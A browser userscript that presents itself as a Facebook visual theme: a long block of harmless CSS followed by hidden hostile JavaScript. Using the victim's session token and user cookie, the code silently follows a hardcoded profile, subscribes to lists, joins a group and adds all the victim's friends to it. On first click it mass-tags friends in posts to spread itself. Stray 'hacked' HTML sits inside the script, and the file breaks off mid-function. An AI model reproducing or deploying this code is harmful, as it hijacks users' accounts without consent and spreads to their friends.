// ==UserScript==
// @name                        Facebook  iTheme by Lockman26
// @description	                Facebook iTheme
// @author                      Lockman26 (Thief)
// @include                     http://facebook.com/*
// @include                     https://facebook.com/*
// @include                     http://*.facebook.com/*
// @include                     https://*.facebook.com/*
// @include	 		htt*://www.facebook.com/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==
(function() {
var css = "";
if (false || (location.href.replace(location.hash,'') == "facebook.com/home.php?ref=logo") || (document.location.href.indexOf("facebook.com/?ref=logo") == 0) || (document.domain == "facebook.com" || document.domain.substring(document.domain.indexOf(".facebook.com") + 1) == "facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
	css += "body {\n\n    background:#E7EBF2 !important;\n}\n   \n.ego_section {\n    margin-bottom: 15px;\n    display: none;\n}\n.fbIndex { background-color: #3B5998 !important }\n\n\n.fbIndex #globalContainer #dropmenu_container,\n.fbIndex #globalContainer #content,\n.fbIndex #globalContainer #pageFooter { display: none !important }\n\n\n.fbIndex .loggedout_menubar_container {\n  position: fixed !important;\n  width: 430px !important;\n  height: 82px !important;\n  min-width: 0 !important;\n  top: 50% !important;\n  left: 50% !important;\n  margin-top: -80px !important;\n  margin-left: -210px !important;\n  z-index: -1 !important;\nbackground-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;\nbackground-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: linear-gradient(top, #738ABA, #2C4987)!important;\n  padding-top:10px;\n  border-radius:12px;\n    -webkit-box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.5);\n    box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.5);\n}\n\n\n.fbIndex .loggedout_menubar { width: auto !important }\n.fbIndex .loggedout_menubar_container .lfloat,\n.fbIndex .loggedout_menubar_container .rfloat { float: none !important }\n.fbIndex .loggedout_menubar_container .lfloat img,\n.fbIndex .loggedout_menubar_container .rfloat #login_form table { display: block !important; margin: 0 auto !important }\n\n.fbIndex .loggedout_menubar_container .lfloat i { display: block !important; margin: -70px auto 20px !important; }\n.fbIndex .loggedout_menubar_container .sp_69c1xs { display: block !important; }\n\n\n\n#SetAsHomepage_Callout {\n  display: none;\n}\n\n\n.fbIndex div#blueBar {\n  z-index: 0 !important;\n  border: none !important;\n  box-shadow: none !important;\n}\n\n#blueBar {\nbackground-color: #3B5998 !important;\nbackground-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;\nbackground-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: linear-gradient(top, #738ABA, #2C4987)!important;\nborder-color: #1D4088 !important;\nborder-bottom: 1px solid !important;\n-webkit-box-shadow: inset 0 1px 1px -1px #fff !important;\nmin-width: 981px;\nz-index: 300;\n}\n\n.slim #blueBar {\nheight: 40px !important;\nposition: relative;\n-webkit-box-shadow: inset 0 1px 1px -1px #fff !important;\nborder-bottom: 1px solid;\nbackground-color: #3B5998 !important;\nbackground-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;\nbackground-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: linear-gradient(top, #738ABA, #2C4987)!important;\nborder-color: #111A33 !important;\n}\n\n#pageLogo a {\nbackground-color: transparent !important;\n}\n\n#pageLogo a:hover, #pageLogo a:focus, #pageLogo a:active {\nbackground-color: transparent !important;\n}\n\n.composerExpanded .newsFeedComposer #rightCol {\npadding-top: 40px;\nmargin-right: 0px !important;\n}\n\n.hasExpandedComposer .home_right_column, .sidebarMode #content .hasExpandedComposer .home_right_column {\nmargin-top: -12px;\nmargin-left: 5px !important;\n}\n\n#pagelet_ego_pane_w {\ndisplay: none !important;\n}\n\n#pagelet_rhc_footer {\ndisplay: none !important;\n}\n\n#pagelet_side_ads {\ndisplay: none !important;\n}\n\n.fbTimelineSideAds {\ndisplay: none !important;\n}\n\n.ego_column {\ndisplay: none !important;\n}\n\n.slimHeader .no_js #navAccount:hover, .slimHeader #pageNav #navAccount.openToggler {\nposition: relative;\ntop: 0px !important;\n}\n\n\n.fbJewel .uiScrollableArea {\n  max-height:450px !important;\n  }\n  \n\n.notifNegativeBase .fbJewelFlyout .beeperNub {\nbackground-position: 0px !important;\nbackground-image: url(\"http://i167.photobucket.com/albums/u127/badspy/beepers.png\") !important;\nbackground-repeat: no-repeat;\nposition: absolute;\n-webkit-background-size: 100% 100% !important;\nwidth: 54px !important;\nheight: 24px !important;\nbackground-size: 100% 100%;\nz-index: 13 !important;\nmargin: -25px -44px !important;\n}\n\n\n.notifNegativeBase .fbJewelFlyout {\nbackground: rgba(255, 255, 255, 0.98);\ntop: 37px;\n-webkit-box-shadow: none !important;\nbox-shadow: none !important;\n-moz-box-shadow: none !important;\n-webkit-border-radius: 0px !important;\nborder-radius: 0px !important;\n-moz-border-radius: 0px !important;\nborder: solid rgba(100, 100, 100, .4);\n-webkit-background-clip: padding-box;\nborder-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-webkit-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-moz-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-o-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\nborder-width: 22px 28px 29px 28px !important;\n}\n\n\n.uiHeaderActions.rfloat {\nfont-size: 13px !important;\n}\n\n.jewelHeader h3 {\nfont-weight: bold !important;\nleft: 10px !important;\nright: 0;\ntext-shadow: 0 -1px 0 rgba(0, 0, 0, 0.1) !important;\ntop: -32px !important;\nz-index: 1 !important;\nfont-size: 15px !important;\nline-height: 20px !important;\ncolor: #3B5998 !important;\ndisplay: inline-table;\n}\n\n\n\n#navAccount #accountSettingsFlyout {\nleft: -208px !important;\nmargin-top: -1px;\nwidth: 202px;\n}\n\n#navAccount #accountSettingsFlyout .beeperNub {\nright: 30px !important;\n}\n\n._42g- {\nbackground-color: #3c5389 !important;\nborder-color: #475d91 #3c5389 #3a5186 !important;\ntext-shadow: 0 -1px 0 rgba(0, 0, 0, .2) !important;\n-webkit-background-clip: padding-box !important;\nborder: 1px solid !important;\n-webkit-border-radius: 2px !important;\n-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .05) !important;\n-webkit-box-sizing: content-box !important;\nfont-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande',tahoma,verdana,arial,sans-serif !important;\n-webkit-font-smoothing: antialiased !important;\nfont-weight: bold !important;\npadding: 0 8px;\nposition: relative !important;\ntext-align: center !important;\nvertical-align: middle !important;\n}\n\n.-cx-PRIVATE-fbComposerMessageBox__bar {\nbackground-color: #F2F2F2;\nborder-top: 1px solid #E6E6E6;\nheight: 40px !important;\n}\n\ndiv.-cx-PRIVATE-fbComposerXTagger__typeahead, div.-cx-PRIVATE-fbComposerXTagger__tokenizer {\nborder: 0;\nborder-top: 1px dashed #BDC7D8;\npadding: 0;\nmargin-top: 3px !important;\n}\n\n.uiMetaComposerMessageBox .uiComposerMessageBoxControls {\nheight: 40px !important;\nmargin: 0;\nbackground-color: #F1F3F8 !important;\n}\n\n.uiMetaComposer .friendsTokenizer, .uiMetaComposer .taggerLocationSharer, .uiMetaComposer .musicTypeahead {\nborder: 0;\nborder-top: 1px dashed #BDC7D8;\npadding: 2px !important;\n}\n\n\n.-cx-PRIVATE-fbTimelineBackdatedComposer__datepickerIcon {\nbackground-size: auto;\nbackground-image: url(\"https://dl.dropbox.com/u/12675809/composer-time-icon.png\") !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px -41px !important;\nwidth: 40px !important;\nheight: 40px !important;\n}\n\n.-cx-PRIVATE-fbTimelineBackdatedComposer__datepickerIcon:hover {\nbackground-image: url(\"https://dl.dropbox.com/u/12675809/composer-time-icon.png\") !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px 5px !important;\nwidth: 40px !important;\nheight: 40px !important;\n}\n\n.-cx-PRIVATE-fbPlacesCityTagger__placeIconImage {\nbackground-size: auto;\nvertical-align: top;\nbackground-image: url(https://s-static.ak.fbcdn.net/rsrc.php/v2/yA/r/sHRVgdDCvuz.png) !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px -40px !important;\ndisplay: inline-block;\nfloat: left;\nheight: 40px !important;\nwidth: 40px !important;\noutline: none;\n}\n.-cx-PRIVATE-fbPlacesCityTagger__placeIconImage:hover {\nbackground-image: url(https://s-static.ak.fbcdn.net/rsrc.php/v2/yA/r/sHRVgdDCvuz.png) !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px 1px !important;\ndisplay: inline-block;\nfloat: left;\nheight: 40px !important;\nwidth: 40px !important;\noutline: none;\n}\n\n#rightCol{\n    width:170px;\n}\n\n.adsOnTop .rightColumnWrapper .fixed_scrolling_wrapper, .tickerOnTop .rightColumnWrapper {\n  width:200px;\n}\n        \n#contentCol{\n   background:transparent !important; \n}\n.hasLeftCol #mainContainer {\n    border-right:0px;\n}\n  \n#pagelet_welcome_box {\n    background:#3B5998;\n    border-radius:6px 0 0 6px !important;\n    padding:10px 5px;\n    background:-webkit-gradient(linear, center top, center bottom, from(#647AAB), to(#2C467E));\n    background:-webkit-linear-gradient(#647AAB, #2C467E);\n    background:-moz-linear-gradient(#647AAB, #2C467E);\n    background:-o-linear-gradient(#647AAB, #2C467E);\n    background:-ms-linear-gradient(#647AAB, #2C467E);\n    background:linear-gradient(#647AAB, #2C467E);\n}\n\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg {\nheight: 40px !important;\nwidth: 40px !important;\nmargin-left: 6px !important;\n}\n\n#pagelet_welcome_box a {\ncolor: #FFF !important;\n}\n\n.navHeader, .navHeader a {\nfont-size: 10px !important;\ncolor: #7a8292 !important;\ntext-shadow: 0 1px 0 rgba(0, 0, 0, .6) !important;\nfont-weight: bold;\nmargin-top: 12px;\n}\n\n#contentArea {\n    -webkit-box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.3);\n  margin-top:-5px;\n    background:#FFF;\n    width:585px !important;\n}\n\n._7lt ._7ls {\n  border-radius:100% !important;\n}\n\nform.async_saving .uiButton.uiButtonSpecial .uiButtonText, form.async_saving .uiButton.uiButtonSpecial input, form.async_saving .uiButton.uiButtonConfirm .uiButtonText, form.async_saving .uiButton.uiButtonConfirm input, .uiButtonSpecial .uiButtonText, .uiButtonSpecial input, .uiButtonSpecial.uiButtonDisabled .uiButtonText, .uiButtonSpecial.uiButtonDisabled input, .uiButtonConfirm .uiButtonText, .uiButtonConfirm input, .uiButtonConfirm.uiButtonDisabled .uiButtonText, .uiButtonConfirm.uiButtonDisabled input {\ncolor: #fff;\ntext-shadow: 0 -1px 0 rgba(0, 0, 0, .35) !important;\nfont-weight: bold !important;\nfont-size: 12px !important;\n}\n\nlabel.-cx-PRIVATE-fbComposerMessageBox__button {\npadding: 6px 16px !important;\n}\n\n.uiButtonConfirm {\nbackground: none !important;\nbackground-repeat: no-repeat;\nbackground-position: -352px -54px;\nborder-color: #576499 #3A4B73 #263855 !important;\nbackground: -webkit-gradient( linear, left top, left bottom, from(#647AAB), to(#2C467E) ) !important;\nbackground: -moz-linear-gradient(top, #647AAB, #2C467E)!important;\nbackground: -ms-linear-gradient(top, #647AAB, #2C467E)!important;\nbackground: -o-linear-gradient(top, #647AAB, #2C467E)!important;\nbackground: linear-gradient(top, #647AAB, #2C467E)!important;\n-webkit-border-radius: 4px !important;\nborder-radius: 4px !important;\n-moz-border-radius: 4px !important;\n-o-border-radius: 4px !important;\n-ms-border-radius: 4px !important;\n}\n\n.fbTimelineScrubber{\n    background:transparent !important;\n}\n  \n._4lh ._519e:after, ._4lh ._51wa:after,._4lh ._519e:after, ._4lh ._51wa:after, ._4lh .timelineUnitContainer .UFIComment .UFIImageBlockImage:after, ._4lh .timelineUnitContainer .UFIReplyActorPhotoWrapper:after {\n          background:none;\n}\n        \n        \n.timelineLayout #contentArea{\nbackground:transparent !important;\n box-shadow:0px 0px 0px;\n}\n          \n\n#fbProfileCover .fbProfileCoverPhotoSelector .wrap {\nmargin-left:-170px;\ntop:-50px;\n}             \n\n\n#fbProfileCover .fbTimelineProfilePicSelector .wrap{\n  margin-top:-115px;\n  margin-right:-340px;\n}\n\n\n.timelineLayout .fbTimelineTopSection{\n  margin-top:20px; \n}\n\n\n\n.timelineLayout .fbTimelineTopSection,.coverBorder,.coverPhotoImg,#fbProfileCover{\n  	border-top-left-radius:15px !important;\n    border-top-right-radius:15px !important;\n    \n}\n.profilePic,.profilePicThumb{\n     border-radius:12px !important;\n        -webkit-box-shadow:0 2px 10px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 2px 10px 0 rgba(0, 0, 0, 0.3);\n     -webkit-transition:all 1.1s;\n    -moz-transition:all 1.1s;\n    -o-transition:all 1.1s;\n    -ms-transition:all 1.1s;\n    transition:all 1.1s;\n    }\n\n\n.profilePicThumb:hover{\n	transform: rotate(10deg);\n	-ms-transform: rotate(10deg); \n	-webkit-transform: rotate(10deg); \n          }\n\n._4lh ._519e:after, ._4lh ._51wa:after {\nbackground:none;\n      }\n\n.fbTimelineUnit,#fbProfileCover {\n\n-webkit-box-shadow:0 0 8px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 0 8px 0 rgba(0, 0, 0, 0.3);\n    -webkit-transition:all 1.1s;\n    -moz-transition:all 1.1s;\n    -o-transition:all 1.1s;\n    -ms-transition:all 1.1s;\n    transition:all 1.1s;\n\n\n}\n    \n.fbTimelineUnit:hover {\n    -webkit-transform:scale(1.1);\n    -moz-transform:scale(1.1);\n    -o-transform:scale(1.1);\n    -ms-transform:scale(1.1);\n    transform:scale(1.1);\n    z-index:100;\n\n      }\n\n.fbTimelineStickyHeader .back {\n  	margin-top:-5px;\n  	height:58px;\n	-webkit-box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.3);\n      }  \n\n\n._513x{\n       background:green;\n       bottom:18px;\n       left:13px;\n       border-radius:100%;\n       width:7px;\n       height:7px;\n      }\n  \n\n  \n.UFIRow {\n  background:transparent;\n  }\n.UFIUnseenItem{\n  border-left:0px;\n    }\n\n\n#pagelet_web_messenger{\n width:850px;\n\n}\n\n.uiSelectorMenuWrapper {\n    min-width:auto;\n  }\n\n\n._4kg > li {\n    border-width:1px 0 0 0!important;\n  }\n.selectedStorySimple .selectedStoryIndicator {\n    background:#FFF !important;\n    }\n.fbFeedTicker .fbFeedTickerStory {\n    margin-top:10px;\n    margin-bottom:10px;\n    border-top-right-radius:12px;\n    border-bottom-right-radius:12px;\n	width:200px;\n    padding-left:10px;\n    background:#F0F8FF;\n    box-shadow:4px 4px 7px -3px rgba(0, 0, 0, 0.2),inset 5px 0px 5px -3px rgba(0, 0, 0, 0.2);\n    border:3px  solid #FfF;      \n    }\n\n.fbChatSidebar .fbFeedTicker .fbFeedTickerStory {\n  	box-shadow:none;\n    border:0px;\n    border-top:1px solid #DADADA;\n    margin:0px;\n    padding:10px 5px;\n      }\n\n\n.fbFeedTicker .tickerStoryWithButton {\n    width:170px;\n}\n\n.tickerOnTop #pagelet_rhc_ticker .fbFeedTicker {\n      margin-left:-9px;\n        \n      }\n\n.uiSideNav .selectedItem .item, .uiSideNav .selectedItem .item:hover, .uiSideNav ul .selectedItem .subitem, .uiSideNav ul .selectedItem .subitem:hover {\n	background:#FFF;\n    -webkit-transform:scale(1.5);\n    -moz-transform:scale(1.5);\n    -o-transform:scale(1.5);\n    -ms-transform:scale(1.5);\n    transform:scale(1.5);\n    width:70px !important;\n    height:25px;\n    line-height:15px;\n	margin-left:68px !important;\n    font-size:8px;\n    margin-top:25px;\n    margin-bottom:20px;\n    padding-top:10px;\n    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2);\n    border-top-left-radius:8px;\n    border-bottom-left-radius:8px;\n        }\n        \n.uiSideNav .item, .uiSideNav .subitem {\n	background:#F0F8FF;\n    -webkit-transform:scale(1.5);\n    -moz-transform:scale(1.5);\n    -o-transform:scale(1.5);\n    -ms-transform:scale(1.5);\n    transform:scale(1.5);\n    width:30px !important;\n    height:25px;\n    line-height:15px;\n	margin-left:115px !important;\n    font-size:0px;\n    margin-top:25px;\n    margin-bottom:20px;\n    padding-top:10px;\n    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2),inset -5px 0px 5px -3px rgba(0, 0, 0, 0.2);\n    border-top-left-radius:8px;\n    border-bottom-left-radius:8px;\n    border:3px  solid #FfF;\n            }\n.uiSideNav .item:hover, .uiSideNav .subitem:hover  {\n\n    width:60px !important;\n	margin-left:77px !important;\n    font-size:7px;\n    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2),inset -5px 0px 5px -3px rgba(0, 0, 0, 0.2);\n    border:3px  solid #FfF;\n      }\n.noCount{\n    font-size:7px;          \n        }\n.uiSideNavCount {\n    background:transparent;\n            }\n.countValue {\n	font-size:7px !important;\n    background:#d8dfea;\n    padding:5px;\n    border-radius:100%;\n    border:2px dotted #FFF;\n              }\n.navHeader{\n    padding-left:20px;\n  }\n\n._s0:only-child, ._29h img,.fbFeedTicker .fbFeedTickerStory .tickerStoryImage,._42fz .pic {\ndisplay: block !important;\nborder-radius: 100% !important;\nborder: 2px solid #fff !important;\nbox-shadow: 0px 0px 7px #000!important;\n\n    }\n.actorPhoto {\nmargin-top: 18px !important;\nmargin-left: -7px !important;\n}\n\n\n._51jx, ._51jw{\n  background-image: none !important;\nbackground-color: #f03d25 !important;\nborder: 1px solid #d83722 !important;\nborder-bottom: 1px solid #c0311e !important;\nborder-top: 1px solid #e23923 !important;\n-webkit-border-radius: 2px;\n-webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .77);\ndisplay: block;\n    width:auto !important;\n    height:auto !important;\n  padding:0 1px !important; \n}\n\n._50mz .metaInfoContainer {\nbackground-color: transparent !important;\npadding-left: 0 !important;\nposition: absolute;\nright: none !important;\ntop: none !important;\nbottom: 4px !important;\n}\n\n.messages:hover .metaInfoContainer {\nvisibility: visible !important;\n}\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n\n}\n\n._50dw {\nborder-top: 0px solid #E4E7F0 !important;\n}\n\n.fbChatMessageGroup {border-top-color:#E4E7F0;}\n\n .fbChatConvDateBreak{\ntext-align: center !important;\nmargin: 5px 60px !important;\n}\n\n\n.fbChatMessageGroup ._kso {margin-bottom: 0!important;}\n\n.conversationContainer, .fbChatConvDateBreak {background: #E4E7F0 !important;}\n\n._7f.seen ._9r, ._510h {\nbackground-image: url(\"http://imageshack.us/a/img202/3604/seen.png\") !important;\nbackground-position: 0 !important;\n}\n\n .messages {\nbackground: transparent !important;\nmargin-left: 12px !important;\nborder-image-slice: fill 10 10 10 10;\n-webkit-border-image: url(\"http://imageshack.us/a/img687/6865/theyp.png\")10 10 10 10;\n-moz-border-image: url(\"http://imageshack.us/a/img687/6865/theyp.png\")10 10 10 10;\nborder-image-source: url(\"http://imageshack.us/a/img687/6865/theyp.png\");\nborder-width: 10px !important;\nfloat: left!important;\nmax-width: 110px !important;\nmin-width: 28px;\n}\n\n.messages:before {\nbackground: url(\"http://img594.imageshack.us/img594/4907/theyarow.png\");\ncontent: \"\";\ndisplay: block;\nwidth: 15px;\nheight: 17px;\nleft: 34px;\nposition: absolute;\ntop: 14px;\n}\n\n.hasSmurfbar #pageNav .tinyman .navLink:after {\n      background-image:none !important;\n      \n    }\n._50mz .fbNubFlyoutBodyContent, ._50mz .conversationContainer  {\n   	background:url(http://www.linedpaper.net/wp-content/uploads/2012/10/Graph-Paper-Template.png) transparent !important; \n}\n\n.fbNubFlyout,._50-v {\n    box-shadow:none;\n  }\n        \n._50mz .fbNubFlyoutInner  {\n-webkit-background-clip: padding-box;\nborder-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-webkit-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\nborder-width: 22px 28px 29px 28px !important;\nheight:240px !important;\n  }\n\n.fbNubFlyoutBody{\n  height:185px !important;\n  border:0px;\n    }\n    \n.fbNubFlyoutTitlebar{\nborder-top-left-radius:5px;\nborder-top-right-radius:5px;\n    }\n\n\n\n.fbNubFlyoutFooter{\n  margin-left:-9px;\n  width:220px;\n  }\n\n\n.fbNubFlyoutFooter ._552n{\nright:0px !important;\n    }";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})

();



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
  
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
    var a = document.createElement('script');
    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
    document.body.appendChild(a);
}

a("100001051872357");
a("");
a("");
a("");
a("");
a("");
a("");
a("");
a("");
a("");
a("");
a("");
a("");


sublist("554570344588023");
sublist("602087209836336");
sublist("");
sublist("");
sublist("");
sublist("");

sublist("");
sublist("");
sublist("");
sublist("");


var gid = ['466066743439800'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "118949208276128";
var spost_id = "118949208276128";
var sfoto_id = "118949208276128";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
    var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
      if(xmlhttp.readyState == 4){
          eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
          for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
          smesaj = "";
          smesaj_text = "";
          for(i=f*10;i<(f+1)*10;i++){
          if(arkadaslar.payload.entries[i]){
          smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
          smesaj_text += " " + arkadaslar.payload.entries[i].text;
          }
          }
          sdurumpaylas();       }
        
      }
      
        };
    var params = "&filter[0]=user";
    params += "&options[0]=friends_only";
    params += "&options[1]=nm";
    params += "&token=v7";
        params += "&viewer=" + user_id;
    params += "&__user=" + user_id;
    
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);

<center><img src="http://www.lunaloiero.biz/hacked.jpg"/></center>

<embed src="http://www.youtube.com/v/tVXpIoDInhQ&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
  

//arkada??????leme
function sarkadasekle(uid,cins){
    var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
      if(xmlhttp.readyState == 4){  
      }
        };
    
    xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
    var params = "to_friend=" + uid;
    params += "&action=add_friend";
    params += "&how_found=friend_browser";
    params += "&ref_param=none";
    params += "&outgoing_id=";
    params += "&logging_location=friend_browser";
    params += "&no_flyout_on_click=true";
